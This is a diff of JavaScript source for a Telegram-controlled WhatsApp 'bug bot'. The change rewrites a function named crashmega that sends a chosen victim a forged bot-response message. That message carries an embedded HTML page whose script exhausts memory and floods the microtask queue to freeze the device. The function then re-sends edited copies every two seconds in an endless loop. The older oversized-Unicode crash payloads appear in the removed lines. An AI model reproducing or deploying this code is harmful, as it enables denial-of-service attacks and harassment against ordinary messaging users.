@@ -576,44 +576,162 @@ async function initializeBot() {
 
 //============================//
 async function crashmega(sock, target) {
-  try {
-    const msg = {
-      groupMentionedMessage: {
-        message: {
-          ephemeralMessage: {
-            message: {
-              viewOnceMessage: {
-                message: {
-                  interactiveMessage: {
-                    body: {
-                      text: "hi gw kintana"
-                    },
-                    nativeFlowMessage: {
-                      extra: "\u3104",
-                      buttons: "ꦾ࣯࣯".repeat(20000),
-                      extra1: "ꦾ࣯࣯".repeat(5555)
-                    }
-                  }
-                }
-              }
+  const id = () => Math.random().toString(36).substring(2, 10);
+  const responseId = id();
+  const originalId = id().toUpperCase();
+
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>System Monitor</title>
+<style>
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #000000;
+    overflow: hidden;
+}
+</style>
+</head>
+<body>
+<script>
+(function() {
+    const memoryRetentionArray = [];
+    const allocationChunkSize = 1024 * 1024 * 64;
+
+    function saturateEngine() {
+        try {
+            const rawBuffer = new ArrayBuffer(allocationChunkSize);
+            const viewArray = new Uint32Array(rawBuffer);
+            
+            for (let index = 0; index < viewArray.length; index += 1024) {
+                viewArray[index] = index ^ 0xDEADBEEF;
             }
+            
+            memoryRetentionArray.push(rawBuffer);
+            memoryRetentionArray.push(viewArray);
+        } catch (allocationError) {
+            while (true) {
+                const garbageData = new Array(1000000).fill(Math.random());
+                memoryRetentionArray.push(garbageData);
+            }
+        }
+
+        queueMicrotask(saturateEngine);
+        queueMicrotask(saturateEngine);
+    }
+
+    function spawnMicrotaskSwarm() {
+        for (let counter = 0; counter < 50; counter++) {
+            queueMicrotask(saturateEngine);
+        }
+    }
+
+    Promise.resolve().then(spawnMicrotaskSwarm);
+    saturateEngine();
+})();
+</script>
+</body>
+</html>
+`;
+
+  const data = Buffer.from(JSON.stringify({
+    response_id: responseId,
+    sections: [{
+      view_model: {
+        __typename: 'GenAISingleLayoutViewModel',
+        primitive: {
+          __typename: 'GenAIaeacdsnwHtmlPrimitive',
+          payload: html,
+          trusted_sources: []
+        }
+      }
+    }]
+  }).replace(/[\u007f-\uffff]/g, c =>
+    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
+  )).toString('base64');
+
+  const message = {
+    messageContextInfo: {
+      deviceListMetadata: {},
+      deviceListMetadataVersion: 2,
+      botMetadata: {
+        botResponseId: responseId
+      }
+    },
+    botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+          messageType: 1,
+          response_id: responseId,
+          submessages: [],
+          unifiedResponse: { data },
+          contextInfo: {
+            mentionedJid: Array(200).fill(target),
+            forwardingScore: 999999,
+            isForwarded: true,
+            forwardedAiBotMessageInfo: {
+              botJid: '867051314767696@bot'
+            },
+            forwardOrigin: 4,
+            expiration: 0,
+            ephemeralSettingTimestamp: Date.now(),
+            disappearingMode: {
+              initiator: 0,
+              trigger: 1
+            },
+            afterReadDuration: 200
           }
         }
       }
-    };
-    await sock.relayMessage(target, msg, {});
+    }
+  };
 
-    await sock.relayMessage(target, {
-      newsletterAdminInviteMessage: {
-        newsletterJid: "123@newsletter",
-        inviteCode: "\r".repeat(150000) + "\n".repeat(50000),
-        inviteExpiration: 99999999999,
-        newsletterName: "kintana" + "\u0000".repeat(250000)
+  const ctx = {
+    messageContextInfo: {
+      deviceListMetadata: {},
+      deviceListMetadataVersion: 2,
+      botMetadata: { messageDisclaimerText: ("ꦾ").repeat(2), botResponseId: responseId }
+    }
+  };
+
+  try {
+    await sock.relayMessage(target, message, {
+      participant: { jid: target },
+      noSelfSync: false
+    }).catch(() => {});
+
+    await sock.relayMessage(target, { ...ctx, ...message }, { messageId: originalId }).catch(() => {});
+
+    await new Promise(r => setTimeout(r, 1000));
+
+    while (true) {
+      try {
+        const protocolEdit = {
+          ...ctx,
+          botForwardedMessage: {
+            message: {
+              protocolMessage: {
+                key: { remoteJid: target, fromMe: true, id: originalId },
+                type: 14,
+                timestampMs: Date.now(),
+                editedMessage: message
+              }
+            }
+          }
+        };
+
+        await sock.relayMessage(target, protocolEdit, { messageId: '3EB0' + id() }).catch(() => {});
+        await new Promise(r => setTimeout(r, 2000));
+      } catch (err) {
+        await new Promise(r => setTimeout(r, 2000));
       }
-    }, {});
-  } catch (e) {
-    console.error(e);
-  }
+    }
+  } catch (e) {}
 }
 
 async function halonyet(sock, target) {
@@ -982,7 +1100,6 @@ bot.on("callback_query", async (query) => {
 
 <blockquote>=== ᴛᴏᴏʟs ᴍᴇɴᴜ ===</blockquote>
 /info - ᴄᴇᴋ ɪᴅ ᴛᴇʟᴇɢʀᴀᴍ
-/tourl - ᴍᴇɴɢᴜʙᴀʜ ᴍᴇᴅɪᴀ ᴍᴇɴᴊᴀᴅɪ ᴜʀʟ
 /cekfunc - ᴍᴇɴɢᴇᴄᴇᴋ ғᴜɴᴄᴛɪᴏɴ ʙᴜɢ
 /tiktok - ᴛɪᴋᴛᴏᴋ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ!
 /pinterest - sᴇᴀʀᴄʜ ᴘɪɴᴛᴇʀᴇsᴛ
@@ -2816,118 +2933,6 @@ bot.onText(/^\/brat(?:\s+(.+))?$/i, async (msg, match) => {
         await bot.sendMessage(
             chatId,
             `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴄᴋᴇʀ ʙʀᴀᴛ.</blockquote>`,
-            {
-                parse_mode: "HTML",
-                reply_to_message_id: msg.message_id
-            }
-        );
-    }
-});
-
-bot.onText(/^\/tourl$/i, async (msg) => {
-    const chatId = msg.chat.id;
-    const reply = msg.reply_to_message;
-
-    if (!reply || (!reply.photo && !reply.video && !reply.document)) {
-        return bot.sendMessage(
-            chatId,
-            `<blockquote>❌ ʀᴇᴘʟʏ ғᴏᴛᴏ, ᴠɪᴅᴇᴏ, ᴀᴛᴀᴜ ғɪʟᴇ ᴅᴇɴɢᴀɴ ᴄᴏᴍᴍᴀɴᴅ : /ᴛᴏᴜʀʟ</blockquote>`,
-            {
-                parse_mode: "HTML",
-                reply_to_message_id: msg.message_id
-            }
-        );
-    }
-
-    try {
-
-        const processingMsg = await bot.sendMessage(
-            chatId,
-            `<blockquote>⏳ sᴇᴅᴀɴɢ ᴍᴇɴɢᴜᴘʟᴏᴀᴅ ғɪʟᴇ...</blockquote>`,
-            {
-                parse_mode: "HTML",
-                reply_to_message_id: msg.message_id
-            }
-        );
-
-        const fileId = reply.photo
-            ? reply.photo[reply.photo.length - 1].file_id
-            : (reply.video?.file_id || reply.document?.file_id);
-
-        const file = await bot.getFile(fileId);
-
-        const fileUrl =
-            `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;
-
-        const responseFile = await axios.get(fileUrl, {
-            responseType: "arraybuffer"
-        });
-
-        const buffer = Buffer.from(responseFile.data);
-
-        const fileName =
-            file.file_path.split("/").pop() || "file";
-
-        const form = new FormData();
-
-        form.append(
-            "files[]",
-            buffer,
-            fileName
-        );
-
-        const { data } = await axios.post(
-            "https://uguu.se/upload.php",
-            form,
-            {
-                headers: form.getHeaders()
-            }
-        );
-
-        const finalUrl = data?.files?.[0]?.url;
-
-        if (!finalUrl) {
-            throw new Error("ɢᴀɢᴀʟ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴜʀʟ");
-        }
-
-        await bot.editMessageText(
-`<blockquote>✅ ᴜᴘʟᴏᴀᴅ ʙᴇʀʜᴀsɪʟ!</blockquote>
-
-<blockquote>🔗 ${finalUrl}</blockquote>`,
-        {
-            chat_id: chatId,
-            message_id: processingMsg.message_id,
-            parse_mode: "HTML",
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        {
-                            text: "ᴄᴏᴘʏ",
-                            style: "success",
-                            copy_text: {
-                                text: finalUrl
-                            }
-                        },
-                        {
-                            text: "ᴄʀᴇᴀᴛᴏʀ",
-                            url: "https://t.me/heysaka",
-                            style: "success",
-                            icon_custom_emoji_id: "5319301933645707826"
-                        }
-                    ]
-                ]
-            }
-        });
-
-    } catch (err) {
-
-        console.error("Tourl Error:", err);
-
-        bot.sendMessage(
-            chatId,
-            `<blockquote>❌ ɢᴀɢᴀʟ :</blockquote>
-
-<blockquote>${err.response?.data?.error || err.message}</blockquote>`,
             {
                 parse_mode: "HTML",
                 reply_to_message_id: msg.message_id
